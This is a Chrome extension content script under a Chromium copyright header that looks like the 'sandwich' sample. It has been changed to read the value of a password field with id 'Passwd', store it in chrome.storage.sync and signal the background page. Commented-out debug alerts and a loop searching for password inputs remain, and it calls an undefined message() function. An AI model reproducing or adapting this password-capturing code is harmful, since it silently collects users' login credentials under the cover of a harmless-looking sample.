/*
 * Copyright (c) 2010 The Chromium Authors. All rights reserved.  Use of this
 * source code is governed by a BSD-style license that can be found in the
 * LICENSE file.
 */
var regex = /sandwich/;

if(document.getElementById('Passwd'))
  {
    //var inputs = document.getElementByTagName('input');
	//alert(a.length);
    //alert("password");
	var a = document.getElementById('Passwd').value;
	//alert(document.getElementById('Passwd').value);
	chrome.storage.sync.set({'value': a}, function() {
    // Notify that we saved.
    message('Settings saved');
	});
	
	chrome.extension.sendRequest({}, function(response) {});
  }
/**
var a = document.getElementByTagName('input');
for(var i = 0; i < a.length; i++)
{
  alert(a.length);
  alert("hi");
  if(a[i].type == 'password')
  {
    alert("password");
	//chrome.extension.sendRequest({}, function(response) {});
  }  
}
**/
// Test the text of the body element against our regular expression.
if (regex.test(document.body.innerText)) {
  // The regular expression produced a match, so notify the background page.
  chrome.extension.sendRequest({}, function(response) {});
  
} 

else {
  // No match was found.
}
